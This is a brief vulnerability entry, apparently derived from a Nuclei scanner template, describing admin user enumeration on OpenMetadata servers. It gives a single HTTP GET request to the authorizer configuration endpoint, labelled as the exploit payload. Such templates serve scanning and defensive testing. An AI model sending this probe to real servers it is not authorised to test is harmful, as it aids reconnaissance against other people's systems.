# Vulnerability: OpenMetadata - Admin User Enumeration
**Classification:** OPENMETADATA
**Source:** Nuclei Template (`openmetadata-admin-userenum.yaml`)

## Description
Enumerates the admin users registered on OpenMetadata server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/v1/system/config/authorizer HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
```

